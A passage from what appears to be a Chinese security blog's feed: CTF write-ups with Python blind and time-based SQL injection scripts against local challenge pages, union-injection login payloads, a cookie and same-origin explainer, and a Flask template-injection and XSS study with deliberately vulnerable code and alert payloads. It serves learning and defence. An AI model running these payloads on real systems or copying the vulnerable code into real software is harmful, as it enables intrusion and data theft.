r=requests.post(<span class="string">&#x27;http://localhost:8080/CNSS/sleep.php&#x27;</span>,data=data,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(each,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> each==<span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="mctf注入1">MCTF注入1</h3><p>记录这道题主要是从这道题见识到了一种新的登录代码(原谅我见识少...) <img src="/images/2017/11/cnss-9.png" /> 具体代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;connect.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/union select/i&#x27;</span>, <span class="variable">$username</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_fetch_row</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$result</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;username error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$password_now</span> = <span class="variable">$result</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span>!=<span class="variable">$password_now</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;password error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中正则只过滤了一个union select是因为我对这个印象比较深刻,是用括号绕过的,所以这里只写了这一个. 然后这个后台是用username来取数据,然后比对password,如果我们用union来提取的话,就可以绕过密码了, 就比如这道题,我们输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; union(select 1,1)#</span><br></pre></td></tr></table></figure><p>密码填1,然后就没有提示错误了,于是就可以对密码进行盲注. 帐号填</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;union(select 1,(ascii(sub(...))=..))#</span><br></pre></td></tr></table></figure><p>密码填1,如果判断正确就没有密码错误的提示,由此进行注入. 然后这道题有个坑,那就是这个表里面没有东西,所以即使你用户名后面and 1=1也是报用户名错误.... 我当时就死在了这里...可惜可惜</p><h3 id="flappy-bird">flappy bird</h3><p>这道题本来我都做出来了...我想到了应该是更新分数那个地方可以注入,无奈我不会...所以没有做... 这次补了一下,可以写了.总的来说还是在输入后面加上if然后搞事情吧比如这道flappy bird,这里我改成了update, update的话后面可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((...),sleep(5),1)#</span><br></pre></td></tr></table></figure><p>来注入,这里我换了一下思路,后面带的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+if((...),10,1)#</span><br></pre></td></tr></table></figure><p>然后如果分数涨了10分,说明正确,否则错误 主要代码如下: 延时注入的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">src</span>):</span><br><span class="line">    src=<span class="built_in">str</span>(src)</span><br><span class="line">    m2=hashlib.md5()</span><br><span class="line">    m2.update(src.encode())</span><br><span class="line">    <span class="keyword">return</span> m2.hexdigest()</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">score=<span class="number">500</span></span><br><span class="line">list1=[<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        score+=<span class="number">1</span></span><br><span class="line">        payload=<span class="string">&#x27;&#123;score&#125; and if(ascii(substr((select flag from flag),</span></span><br><span class="line"><span class="string">        &#123;num&#125;,1))=&#123;ascii_sql&#125;,sleep(3),1)#&#x27;</span>.<span class="built_in">format</span>(score=score,num=num,ascii_sql=<span class="built_in">ord</span>(each))</span><br><span class="line">        check=md5(payload)</span><br><span class="line">        data=&#123;<span class="string">&#x27;score&#x27;</span>:payload,<span class="string">&#x27;check_code&#x27;</span>:check&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(<span class="string">&#x27;http://localhost:8080/flappy/game.php&#x27;</span>,data=data,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag+=each</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相加脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">src</span>):</span><br><span class="line">    src=<span class="built_in">str</span>(src)</span><br><span class="line">    m2=hashlib.md5()</span><br><span class="line">    m2.update(src.encode())</span><br><span class="line">    <span class="keyword">return</span> m2.hexdigest()</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">r=requests.get(<span class="string">&#x27;http://localhost:8080/flappy/game.php&#x27;</span>)</span><br><span class="line">list1=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        score_now=<span class="built_in">int</span>(re.findall(<span class="string">r&#x27;&lt;strong&gt;(\d+)&lt;/strong&gt;&#x27;</span>,r.text)[<span class="number">0</span>])</span><br><span class="line">        payload=<span class="string">&#x27;&#123;score&#125;+if(ascii(substr((select flag from flag),&#123;num1&#125;,1))=</span></span><br><span class="line"><span class="string">&#123;ascii_sql&#125;,10,1)#&#x27;</span>.<span class="built_in">format</span>(score=score_now,num1=num,ascii_sql=<span class="built_in">ord</span>(each))</span><br><span class="line">        check=md5(payload)</span><br><span class="line">        data=&#123;<span class="string">&#x27;score&#x27;</span>:payload,<span class="string">&#x27;check_code&#x27;</span>:check&#125;</span><br><span class="line">        r=requests.post(<span class="string">&#x27;http://localhost:8080/flappy/game.php&#x27;</span>,data=data)</span><br><span class="line">        r=requests.get(<span class="string">&#x27;http://localhost:8080/flappy/game.php&#x27;</span>)</span><br><span class="line">        score_next=re.findall(<span class="string">r&#x27;&lt;strong&gt;(\d+)&lt;/strong&gt;&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(score_next)-<span class="built_in">int</span>(score_now)==<span class="number">10</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(each))</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cookie的补充学习</title>
      <link href="/2017/11/02/cookie%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/"/>
      <url>/2017/11/02/cookie%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="同源策略">同源策略</h3><p>所有浏览器都实行同源策略,含义大概就是,A网页设置的cookie,B网页打不开,除非这两个网页"同源" 所谓的同源就是</p><blockquote><ul><li>协议相同</li><li>域名相同</li><li>端口相同</li></ul></blockquote><p>举例来说:http://www.example.com的协议是http,域名是www.example.com,端口80 他的同源情况如下:</p><blockquote><ul><li>http://www.example.com/page.html(同源)</li><li>http://example.com/page.html(不同源,域名不同,www.example.com是二级域名)</li><li>https://www.example.com/page.html(不同源,协议不同,这个是https,前面的是http)</li><li>http://www.example.com:81/page.html(不同源,端口不同,前面80,这个81)</li></ul></blockquote><h4 id="同源策略的目的">同源策略的目的</h4><p>同源策略的目的是为了保证用户的安全,防止恶意网站窃取cookie。如果没有同源策略,A网站的cookie可以在用户流量A后浏览B网站时被B获取,那么A的cookie就可能被B利用,这样就会导致一些不得了的事情.</p><h4 id="限制范围">限制范围</h4><p>而且现在随着互联网的发展,"同源策略"越来越严格,如果不是同源的话,共有三种行为会受限制</p><blockquote><ol type="1"><li>cookie,localstoragy,indexdb无法获取</li><li>dom无法获取</li><li>ajax请求无法发送</li></ol></blockquote><p>虽然这些限制很有必要,但是有时很不方便。例如我同一个网站的不同域名之间不能共享cookie,再例如我前端页面项目的域名与我后端服务的域名不同,就不能发送ajax请求来访问 后端的服务etc... 如果要避免的话可以使用jsonp和cors两种方法(后续补上...顺便学习)</p><h3 id="cookie作用域">cookie作用域</h3><p>这就要看cookie的两个属性了,一个是domain,一个是path,用来指示cookie的作用域 domain告诉浏览器cookie的域名归属,未指定的时候就是当前域名 path告诉浏览器cookie的路径归属,未指定就是当前路径,比如通过访问www.vinceruan.info/java/hotspot.html添加的Cookie的默认路径就是/java/,通过blog.vinceruan.info/java/hotspot.html生成的Cookie的路径也是/java/. cookie的提交需要满足两点: 1.cookie为当前域名或者父域名下的cookie 2.cookie为当前路径或者父路径下的cookie 举个例子:要访问blog.example.com的时候</p><blockquote><ul><li>cookie1:[name=value,domain=.example.com,path=/] (可以提交.example.com是blog.example.com的父域名,path也一致)</li><li>cookie2:[name=value,domain=blog.example.com,path=/] (不能提交,域名一致,但是路径不一致)</li><li>cookie3:[name=value,domain=www.example.com,path=/] (不能提交,虽然路径一致但域名不一致)</li><li>cookie4:[name=value,domain=blog.example.com,path=/] (可以提交,域名路径严格一致)</li></ul></blockquote><h4 id="关于httponly">关于httponly</h4><p>httponly这个点之前一直没看,近期补了一下 大概就是说被设置为httponly的cookie不能通过document.cookie来被获取 因此就不会被黑客用xss轻易获取了.</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>flask下模版注入学习</title>
      <link href="/2017/11/01/flask%E4%B8%8B%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2017/11/01/flask%E4%B8%8B%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><strong>文章参考自<a href="http://www.freebuf.com/articles/web/88768.html">这里</a></strong> 以前只会一点php的漏洞,这里学习一下python开发的网站的漏洞</p><h3 id="服务器模版注入">服务器模版注入</h3><p>代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello-template-injection&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_ssti</span>():</span><br><span class="line">    person = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;world&quot;</span>, <span class="string">&#x27;secret&#x27;</span>:<span class="string">&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person[<span class="string">&#x27;name&#x27;</span>] = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;&#x27;&#x27;</span>%person[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, person=person)</span><br><span class="line"><span class="comment">##### Private function if the user has local files.###</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_file</span>(<span class="params">f_name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(f_name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.readlines()</span><br><span class="line"></span><br><span class="line">app.jinja_env.<span class="built_in">globals</span>[<span class="string">&#x27;get_user_file&#x27;</span>] = get_user_file </span><br><span class="line"><span class="comment"># Allows for use in Jinja2 templates</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这里的服务器会在其context中执行用户输入的代码比如 <img src="/images/2017/11/flask1.png" alt="blacsheep" /> 而且加上在这个应用里面有获取文件信息的功能,所以还会导致文件包含的漏洞,比如 <img src="/images/2017/11/flask2.png" alt="blacsheep" /> 甚至是py的源代码 <img src="/images/2017/11/flask3.png" alt="blacsheep" /> 然后补的话也简单,这里主要还是开发者个人的问题,如果我们利用jinja2在模版里面用<code>&#123;&#123;&#125;&#125;</code>来包含变量,就不会导致任意代码的执行了 <img src="/images/2017/11/flask4.png" alt="blacsheep" /></p><h3 id="xss">xss</h3><p>这里不得不说有个很迷的事情... flask对很多文件提供了自动转义的特性,但是这里还是得说</p><blockquote><p>1.模版可以关闭自动转义的特性 2.模版字符串非公共文件扩展名(.html,.htm一类)的时候不启用自动转义功能</p></blockquote><p>所以按道理来说,payload为 http://127.0.0.1:5000/hello-template-injection?name=123.%3Cscript%3Ealert(/xss/)%3C/script%3E 的时候应该是会xss的,但是却并没有,我也不知道为什么,大概是玄学吧,后期要是懂了会回来改的...附图 <img src="/images/2017/11/flask5.png" alt="blacsheep" /></p><h3 id="静态模版xss">静态模版xss</h3><p>有的应用使用的是静态的模版,利用render_template返回,而render_template并不是一个会自动转义的扩展,所以如果我们hello.unsafe里面没有加转义的话,还是会导致xss的,比如我们在flaskrun.py下面建一个templates文件夹,里面放一个模版名字叫hello.unsafe(就用别人的名字了,我懒得想),然后里面写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% autoescape true %&#125; </span><br><span class="line">&lt;h2&gt;Good&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    Hello &#123;&#123; name &#125;&#125;! I don<span class="string">&#x27;t trust your input. I escaped it, just in case.</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&#123;% endautoescape %&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;h2&gt;Bad&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;</span></span><br><span class="line"><span class="string">    I trust all data! How are you &#123;&#123; name &#125;&#125;? </span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br></pre></td></tr></table></figure><p>顺便改一下python的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello-template-injection&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_ssti</span>():</span><br><span class="line">    person = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;world&quot;</span>, <span class="string">&#x27;secret&#x27;</span>:<span class="string">&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person[<span class="string">&#x27;name&#x27;</span>] = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h2&gt;Hello &#123;&#123;person.name&#125;&#125;!&lt;/h2&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, person=person)</span><br><span class="line"><span class="comment">##### Private function if the user has local files.###</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello-xss&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_xss</span>():</span><br><span class="line">    name = <span class="string">&quot;world&quot;</span></span><br><span class="line">    template = <span class="string">&#x27;hello.unsafe&#x27;</span> <span class="comment"># &#x27;unsafe&#x27; file extension... totally legit.</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(template, name=name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_file</span>(<span class="params">f_name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(f_name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment">#app.jinja_env.globals[&#x27;get_user_file&#x27;] = get_user_file # Allows for use in Jinja2 templates</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>xss的图 <img src="/images/2017/11/flask6.png" alt="blacsheep" /> 所以我们应该开启自动转义 在bad部分里面把改成 <img src="/images/2017/11/flask7.png" alt="blacsheep" /></p><h3 id="flask属性xss">flask属性xss</h3><p>首先代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello-template-injection&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_ssti</span>():</span><br><span class="line">    person = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;world&quot;</span>, <span class="string">&#x27;secret&#x27;</span>:<span class="string">&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span 